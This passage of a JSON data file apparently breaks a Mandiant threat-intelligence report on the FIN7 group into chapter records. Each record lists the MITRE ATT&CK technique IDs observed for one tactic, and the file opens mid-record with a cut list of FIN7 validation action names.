FIN7, BATELEUR, Execution\nA151-044;Protected Theater - FIN7, CARBANAK, Execution\nA150-366;Protected Theater - FIN7, CULTSWAP, Execution\nA150-591;Protected Theater - FIN7, GRIFFON, Execution\nA151-170;Protected Theater - FIN7, GRIFFON, Execution, JavaScript Variant\nA151-169;Protected Theater - FIN7, GRIFFON, Execution, Word Document Variant\n"
        }
    },
    {
        "report": {
            "id": "report_0x84f62613",
            "date": "20220404",
            "title": "FIN7 Power Hour: Adversary Archaeology and the Evolution of FIN7",
            "url": "https://www.mandiant.com/resources/evolution-of-fin7"
        },
        "chapter": {
            "id": "chapter_0xf1a9f797",
            "title": "MITRE ATT&CK Mapping",
            "text": "Throughout 2020 and 2021, Mandiant has observed FIN7 use the following techniques:"
        }
    },
    {
        "report": {
            "id": "report_0x84f62613",
            "date": "20220404",
            "title": "FIN7 Power Hour: Adversary Archaeology and the Evolution of FIN7",
            "url": "https://www.mandiant.com/resources/evolution-of-fin7"
        },
        "chapter": {
            "id": "chapter_0xad85b32",
            "title": "Execution",
            "text": "T1059: Command and Scripting Interpreter\nT1059.001: PowerShell\nT1059.003: Windows Command Shell\nT1059.005: Visual Basic\nT1059.007: JavaScript\nT1204.001: Malicious Link\nT1204.002: Malicious File\nT1569.002: Service Execution"
        }
    },
    {
        "report": {
            "id": "report_0x84f62613",
            "date": "20220404",
            "title": "FIN7 Power Hour: Adversary Archaeology and the Evolution of FIN7",
            "url": "https://www.mandiant.com/resources/evolution-of-fin7"
        },
        "chapter": {
            "id": "chapter_0xab6a4220",
            "title": "Initial Access",
            "text": "T1195.002: Compromise Software Supply Chain\nT1199: Trusted Relationship\nT1566.001: Spearphishing Attachment\nT1566.002: Spearphishing Link"
        }
    },
    {
        "report": {
            "id": "report_0x84f62613",
            "date": "20220404",
            "title": "FIN7 Power Hour: Adversary Archaeology and the Evolution of FIN7",
            "url": "https://www.mandiant.com/resources/evolution-of-fin7"
        },
        "chapter": {
            "id": "chapter_0xe32f5458",
            "title": "Impact",
            "text": "T1491.002: External Defacement"
        }
    },
    {
        "report": {
            "id": "report_0x84f62613",
            "date": "20220404",
            "title": "FIN7 Power Hour: Adversary Archaeology and the Evolution of FIN7",
            "url": "https://www.mandiant.com/resources/evolution-of-fin7"
        },
        "chapter": {
            "id": "chapter_0xa5ba4564",
            "title": "Resource Development",
            "text": "T1583.003: Virtual Private Server\nT1588.003: Code Signing Certificates\nT1588.004: Digital Certificates\nT1608.003: Install Digital Certificate\nT1608.005: Link Target"
        }
    },
    {
        "report": {
            "id": "report_0x84f62613",
            "date": "20220404",
            "title": "FIN7 Power Hour: Adversary Archaeology and the Evolution of FIN7",
            "url": "https://www.mandiant.com/resources/evolution-of-fin7"
        },
        "chapter": {
            "id": "chapter_0x1558fc26",
            "title": "Defense Evasion",
            "text": "T1027: Obfuscated Files or Information\nT1027.005: Indicator Removal from Tools\nT1036: Masquerading\nT1036.003: Rename System Utilities\nT1055: Process Injection\nT1070.004: File Deletion\nT1140: Deobfuscate/Decode Files or Information\nT1218.010: Regsvr32\nT1218.011: Rundll32\nT1497.001: System Checks\nT1553.002: Code Signing\nT1564.003: Hidden Window\nT1620: Reflective Code Loading"
        }
    },
    {
        "report": {
            "id": "report_0x84f62613",
            "date": "20220404",
            "title": "FIN7 Power Hour: Adversary Archaeology and the Evolution of FIN7",
            "url": "https://www.mandiant.com/resources/evolution-of-fin7"
        },
        "chapter": {
            "id": "chapter_0x4ca0d4a3",
            "title": "Collection",
            "text": "T1113: Screen Capture\nT1213: Data from Information Repositories\nT1560: Archive Collected Data"
        }
    },
    {
        "report": {
            "id": "report_0x84f62613",
            "date": "20220404",
            "title": "FIN7 Power Hour: Adversary Archaeology and the Evolution of FIN7",
            "url": "https://www.mandiant.com/resources/evolution-of-fin7"
        },
        "chapter": {
            "id": "chapter_0xb51c6175",
            "title": "Lateral Movement",
            "text": "T1021.001: Remote Desktop Protocol\nT1021.004: SSH"
        }
    },
    {
        "report": {
            "id": "report_0x84f62613",
            "date": "20220404",
            "title": "FIN7 Power Hour: Adversary Archaeology and the Evolution of FIN7",
            "url": "https://www.mandiant.com/resources/evolution-of-fin7"
        },
        "chapter": {
            "id": "chapter_0x913e87bf",
            "title": "Command and Control",
            "text": "T1071.001: Web Protocols\nT1090: Proxy\nT1095: Non-Application Layer Protocol\nT1105: Ingress Tool Transfer\nT1132.001: Standard Encoding\nT1573.002: Asymmetric Cryptography"
        }
    },
    {
        "report": {
            "id": "report_0x84f62613",
            "date": "20220404",
            "title": "FIN7 Power Hour: Adversary Archaeology and the Evolution of FIN7",
            "url": "https://www.mandiant.com/resources/evolution-of-fin7"
        },
        "chapter": {
            "id": "chapter_0xeadaae0d",
            "title": "Discovery",
            "text": "T1012: Query Registry\nT1033: System Owner/User Discovery\nT1057: Process Discovery\nT1069: Permission Groups Discovery\nT1069.002: Domain Groups\nT1082: System Information Discovery\nT1083: File and Directory Discovery\nT1087: Account Discovery\nT1087.002: Domain Account\nT1482: Domain Trust Discovery\nT1518: Software Discovery"
        }
    },
    {
        "report": {
            "id": "report_0x84f62613",
            "date": "20220404",
            "title": "FIN7 Power Hour: Adversary Archaeology and the Evolution of FIN7",
            "url": "https://www.mandiant.com/resources/evolution-of-fin7"
        },
        "chapter": {
            "id": "chapter_0x6339ede2",
            "title": "Credential Access",
            "text": "T1110.002: Password Cracking\nT1555.003: Credentials from Web Browsers\nT1558.003: Kerberoasting"
        }
    }
]